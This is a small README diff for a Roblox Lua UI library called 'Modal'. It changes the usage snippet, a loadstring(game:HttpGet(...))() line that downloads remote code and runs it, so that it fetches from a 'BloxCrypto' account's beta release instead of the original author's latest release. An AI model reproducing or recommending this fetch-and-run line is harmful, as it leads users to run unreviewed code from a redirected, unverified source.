@@ -16,7 +16,7 @@
 ## 🚀 Usage
 🛠️ Check out [the template](https://github.com/lxte/Modal/blob/main/Template.luau) to see all components and how to use them
 ```lua
-local Modal = loadstring(game:HttpGet("https://github.com/lxte/Modal/releases/latest/download/main.lua"))()
+local Modal = loadstring(game:HttpGet("https://github.com/BloxCrypto/Modal/releases/download/v1.0-beta/main.lua"))()
 ```
 
 ## 🔨 Credits
